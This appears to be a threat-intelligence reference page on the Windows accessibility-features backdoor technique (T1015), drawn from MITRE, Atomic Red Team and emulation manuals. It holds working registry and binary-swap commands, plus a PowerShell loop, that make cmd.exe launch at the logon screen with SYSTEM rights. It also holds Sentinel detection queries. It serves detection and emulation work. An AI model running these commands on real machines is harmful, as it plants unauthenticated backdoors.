
# Accessibility Features

## Description

### MITRE Description

> Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

## Additional Attributes

* Bypass: None
* Effective Permissions: ['SYSTEM']
* Network: intentionally left blank
* Permissions: ['Administrator']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1015

## Potential Commands

```
Sticky Keys Persistence via Registry Manipulations:
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
Sticky Keys Persistence via Registry Manipulations:
shell REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
post/windows/manage/sticky_keys
Sticky Keys Persistence via binary swapping:
takeown.exe C:\Windows\system32\sethc.exe
del C:\Windows\system32\sethc.exe
copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
Sticky Keys Persistence via binary swapping:
shell takeown.exe C:\Windows\system32\sethc.exe
shell del C:\Windows\system32\sethc.exe
shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){   
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}

$input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "C:\windows\system32\cmd.exe"
Foreach ($item in $input_table){   
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}

cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AtBroker.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
powershell/lateral_movement/invoke_wmi_debugger
powershell/lateral_movement/invoke_wmi_debugger
powershell/persistence/misc/debugger
powershell/persistence/misc/debugger
```

## Commands Dataset

```
[{'command': 'Sticky Keys Persistence via Registry Manipulations:\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v '
             'Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via Registry Manipulations:\n'
             'shell REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v '
             'Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'post/windows/manage/sticky_keys',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via binary swapping:\n'
             'takeown.exe C:\\Windows\\system32\\sethc.exe\n'
             'del C:\\Windows\\system32\\sethc.exe\n'
             'copy C:\\Windows\\system32\\cmd.exe '
             'C:\\Windows\\system32\\sethc.exe',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via binary swapping:\n'
             'shell takeown.exe C:\\Windows\\system32\\sethc.exe\n'
             'shell del C:\\Windows\\system32\\sethc.exe\n'
             'shell copy C:\\Windows\\system32\\cmd.exe '
             'C:\\Windows\\system32\\sethc.exe',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': '$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, '
             'narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")\n'
             '$Name = "Debugger"\n'
             '$Value = "#{attached_process}"\n'
             'Foreach ($item in $input_table){   \n'
             '  $item = $item.trim()\n'
             '  $registryPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\$item"\n'
             '  IF(!(Test-Path $registryPath))\n'
             '  {\n'
             '    New-Item -Path $registryPath -Force\n'
             '    New-ItemProperty -Path $registryPath -Name $name -Value '
             '$Value -PropertyType STRING -Force\n'
             '  }\n'
             '  ELSE\n'
             '  {\n'
             '    New-ItemProperty -Path $registryPath -Name $name -Value '
             '$Value\n'
             '  }\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1015/T1015.yaml'},
 {'command': '$input_table = "#{parent_list}".split(",")\n'
             '$Name = "Debugger"\n'
             '$Value = "C:\\windows\\system32\\cmd.exe"\n'
             'Foreach ($item in $input_table){   \n'
             '  $item = $item.trim()\n'
             '  $registryPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\$item"\n'
             '  IF(!(Test-Path $registryPath))\n'
             '  {\n'
             '    New-Item -Path $registryPath -Force\n'
             '    New-ItemProperty -Path $registryPath -Name $name -Value '
             '$Value -PropertyType STRING -Force\n'
             '  }\n'
             '  ELSE\n'
             '  {\n'
             '    New-ItemProperty -Path $registryPath -Name $name -Value '
             '$Value\n'
             '  }\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1015/T1015.yaml'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\osk.exe /v "Debugger" /t REG_SZ /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger '
             '/d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell/lateral_movement/invoke_wmi_debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_wmi_debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Accessibility Features',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_parent_path '
           'contains"winlogon.exe"and (process_path contains "sethc.exe"or '
           'process_path contains "utilman.exe"or process_path contains '
           '"osk.exe"or process_path contains "magnify.exe"or process_path '
           'contains "displayswitch.exe"or process_path contains '
           '"narrator.exe"or process_path contains "atbroker.exe")'},
 {'name': 'Accessibility Features Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and registry_key_path contains '
           '"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Image File Execution Options\\\\*"'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Sticky '
                                                                              'Keys '
                                                                              'Persistence '
                                                                              'via '
                                                                              'Registry '
                                                                              'Manipulations:\n'
                                                                              'REG '
                                                                              'ADD '
                                                                              '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                              'NT\\CurrentVersion\\Image '
                                                                              'File '
                                                                              'Execution '
                                                                              'Options\\sethc.exe" '
                                                                              '/v '
                                                                              'Debugger '
                                                                              '/t '
                                                                              'REG_SZ '
                                                                              '/d '
                                                                              '"C:\\windows\\system32\\cmd.exe" '
                                                                              '/f',
                                                  'Category': 'T1015',
                                                  'Cobalt Strike': 'Sticky '
                                                                   'Keys '
                                                                   'Persistence '
                                                                   'via '
                                                                   'Registry '
                                                                   'Manipulations:\n'
                                                                   'shell REG '
                                                                   'ADD '
                                                                   '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                   'NT\\CurrentVersion\\Image '
                                                                   'File '
                                                                   'Execution '
                                                                   'Options\\sethc.exe" '
                                                                   '/v '
                                                                   'Debugger '
                                                                   '/t REG_SZ '
                                                                   '/d '
                                                                   '"C:\\windows\\system32\\cmd.exe" '
                                                                   '/f',
                                                  'Description': 'Modify the '
                                                                 'registry to '
                                                                 'point the '
                                                                 'sethc.exe '
                                                                 'file to '
                                                                 'point to '
                                                                 'cmd.exe',
                                                  'Metasploit': 'post/windows/manage/sticky_keys'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Sticky '
                                                                              'Keys '
                                                                              'Persistence '
                                                                              'via '
                                                                              'binary '
                                                                              'swapping:\n'
                                                                              'takeown.exe '
                                                                              'C:\\Windows\\system32\\sethc.exe\n'
                                                                              'del '
                                                                              'C:\\Windows\\system32\\sethc.exe\n'
                                                                              'copy '
                                                                              'C:\\Windows\\system32\\cmd.exe '
                                                                              'C:\\Windows\\system32\\sethc.exe',
                                                  'Category': 'T1015',
                                                  'Cobalt Strike': 'Sticky '
                                                                   'Keys '
                                                                   'Persistence '
                                                                   'via binary '
                                                                   'swapping:\n'
                                                                   'shell '
                                                                   'takeown.exe '
                                                                   'C:\\Windows\\system32\\sethc.exe\n'
                                                                   'shell del '
                                                                   'C:\\Windows\\system32\\sethc.exe\n'
                                                                   'shell copy '
                                                                   'C:\\Windows\\system32\\cmd.exe '
                                                                   'C:\\Windows\\system32\\sethc.exe',
                                                  'Description': 'Remove the '
                                                                 'real '
                                                                 'sethc.exe '
                                                                 'and replace '
                                                                 'it with a '
                                                                 'copy of '
                                                                 'cmd.exe. You '
                                                                 'can also '
                                                                 'just move '
                                                                 'the original '
                                                                 'sethc.exe to '
                                                                 'a different '
                                                                 'file if you '
                                                                 "don't want "
                                                                 'to delete it',
                                                  'Metasploit': ''}},
 {'Atomic Red Team Test - Accessibility Features': {'atomic_tests': [{'description': 'Attaches '
                                                                                     'cmd.exe '
                                                                                     'to '
                                                                                     'a '
                                                                                     'list '
                                                                                     'of '
                                                                                     'processes. '
                                                                                     'Configure '
                                                                                     'your '
                                                                                     'own '
                                                                                     'Input '
                                                                                     'arguments '
                                                                                     'to '
                                                                                     'a '
                                                                                     'different '
                                                                                     'executable '
                                                                                     'or '
                                                                                     'list '
                                                                                     'of '
                                                                                     'executables.\n'
                                                                                     '\n'
                                                                                     'Upon '
                                                                                     'successful '
                                                                                     'execution, '
                                                                                     'powershell '
                                                                                     'will '
                                                                                     'modify '
                                                                                     'the '
                                                                                     'registry '
                                                                                     'and '
                                                                                     'swap '
                                                                                     'osk.exe '
                                                                                     'with '
                                                                                     'cmd.exe.\n',
                                                                      'executor': {'cleanup_command': '$input_table '
                                                                                                      '= '
                                                                                                      '"#{parent_list}".split(",")\n'
                                                                                                      'Foreach '
                                                                                                      '($item '
                                                                                                      'in '
                                                                                                      '$input_table)\n'
                                                                                                      '{\n'
                                                                                                      '  '
                                                                                                      '$item '
                                                                                                      '= '
                                                                                                      '$item.trim()\n'
                                                                                                      '  '
                                                                                                      'reg '
                                                                                                      'delete '
                                                                                                      '"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows '
                                                                                                      'NT\\CurrentVersion\\Image '
                                                                                                      'File '
                                                                                                      'Execution '
                                                                                                      'Options\\$item" '
                                                                                                      '/v '
                                                                                                      'Debugger '
                                                                                                      '/f '
                                                                                                      '| '
                                                                                                      'Out-Null\n'
                                                                                                      '}\n',
                                                                                   'command': '$input_table '
                                                                                              '= '
                                                                                              '"#{parent_list}".split(",")\n'
                                                                                              '$Name '
                                                                                              '= '
                                                                                              '"Debugger"\n'
                                                                                              '$Value '
                                                                                              '= '
                                                                                              '"#{attached_process}"\n'
                                                                                              'Foreach '
                                                                                              '($item '
                                                                                              'in '
                                                                                              '$input_table){   \n'
                                                                                              '  '
                                                                                              '$item '
                                                                                              '= '
                                                                                              '$item.trim()\n'
                                                                                              '  '
                                                                                              '$registryPath '
                                                                                              '= '
                                                                                              '"HKLM:\\SOFTWARE\\Microsoft\\Windows '
                                                                                              'NT\\CurrentVersion\\Image '
                                                                                              'File '
                                                                                              'Execution '
                                                                                              'Options\\$item"\n'
                                                                                              '  '
                                                                                              'IF(!(Test-Path '
                                                                                              '$registryPath))\n'
                                                                                              '  '
                                                                                              '{\n'
                                                                                              '    '
                                                                                              'New-Item '
                                                                                              '-Path '
                                                                                              '$registryPath '
                                                                                              '-Force\n'
                                                                                              '    '
                                                                                              'New-ItemProperty '
                                                                                              '-Path '
                                                                                              '$registryPath '
                                                                                              '-Name '
                                                                                              '$name '
                                                                                              '-Value '
                                                                                              '$Value '
                                                                                              '-PropertyType '
                                                                                              'STRING '
                                                                                              '-Force\n'
                                                                                              '  '
                                                                                              '}\n'
                                                                                              '  '
                                                                                              'ELSE\n'
                                                                                              '  '
                                                                                              '{\n'
                                                                                              '    '
                                                                                              'New-ItemProperty '
                                                                                              '-Path '
                                                                                              '$registryPath '
                                                                                              '-Name '
                                                                                              '$name '
                                                                                              '-Value '
                                                                                              '$Value\n'
                                                                                              '  '
                                                                                              '}\n'
                                                                                              '}\n',
                                                                                   'elevation_required': True,
                                                                                   'name': 'powershell'},
                                                                      'input_arguments': {'attached_process': {'default': 'C:\\windows\\system32\\cmd.exe',
                                                                                                               'description': 'Full '
                                                                                                                              'path '
                                                                                                                              'to '
                                                                                                                              'process '
                                                                                                                              'to '
                                                                                                                              'attach '
                                                                                                                              'to '
                                                                                                                              'target '
                                                                                                                              'in '
                                                                                                                              '#{parent_list}. '
                                                                                                                              'Default: '
                                                                                                                              'cmd.exe\n',
                                                                                                               'type': 'Path'},
                                                                                          'parent_list': {'default': 'osk.exe, '
                                                                                                                     'sethc.exe, '
                                                                                                                     'utilman.exe, '
                                                                                                                     'magnify.exe, '
                                                                                                                     'narrator.exe, '
                                                                                                                     'DisplaySwitch.exe, '
                                                                                                                     'atbroker.exe',
                                                                                                          'description': 'Comma '
                                                                                                                         'separated '
                                                                                                                         'list '
                                                                                                                         'of '
                                                                                                                         'system '
                                                                                                                         'binaries '
                                                                                                                         'to '
                                                                                                                         'which '
                                                                                                                         'you '
                                                                                                                         'want '
                                                                                                                         'to '
                                                                                                                         'attach '
                                                                                                                         'each '
                                                                                                                         '#{attached_process}. '
                                                                                                                         'Default: '
                                                                                                                         '"osk.exe"\n',
                                                                                                          'type': 'String'}},
                                                                      'name': 'Attaches '
                                                                              'Command '
                                                                              'Prompt '
                                                                              'as '
                                                                              'a '
                                                                              'Debugger '
                                                                              'to '
                                                                              'a '
                                                                              'List '
                                                                              'of '
                                                                              'Target '
                                                                              'Processes',
                                                                      'supported_platforms': ['windows']}],
                                                    'attack_technique': 'T1015',
                                                    'display_name': 'Accessibility '
                                                                    'Features'}},
 {'Threat Hunting Tables': {'chain_id': '100175',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\osk.exe /v '
                                             '"Debugger" /t REG_SZ /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100176',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\sethc.exe /t '
                                             'REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100177',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\utilman.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100178',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\magnify.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100179',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\narrator.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100180',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution '
                                             'Options\\DisplaySwitch.exe /t '
                                             'REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100181',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\AtBroker.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1015',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_wmi_debugger":  '
                                                                                 '["T1015"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_wmi_debugger',
                                            'Technique': 'Accessibility '
                                                         'Features'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1015',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/misc/debugger":  '
                                                                                 '["T1015"],',
                                            'Empire Module': 'powershell/persistence/misc/debugger',
                                            'Technique': 'Accessibility '
                                                         'Features'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [APT3](../actors/APT3.md)

* [APT29](../actors/APT29.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [Axiom](../actors/Axiom.md)
    
* [APT41](../actors/APT41.md)
    
